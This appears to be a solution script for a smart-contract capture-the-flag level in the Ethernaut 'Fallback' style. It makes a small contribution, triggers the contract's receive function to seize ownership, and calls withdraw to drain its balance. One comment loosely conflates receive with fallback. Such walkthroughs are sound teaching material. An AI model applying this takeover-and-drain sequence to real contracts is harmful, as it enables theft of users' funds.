await contract.address;
// player 
// Send transaction via contribute method
await contract.contribute.sendTransaction({
    from: player, 
    to: contract.address,
    value: toWei("0.0009"),
})

// receive() external payable {
//     require(msg.value > 0 && contributions[msg.sender] > 0);
//     owner = msg.sender;
//   }
// It is called when a non-existent function is called on the contract.
// Send transaction via non-existent method
await contract.sendTransaction({
    from: player, 
    to: contract.address,
    value: toWei("0.01"),
})

await contract.withdraw();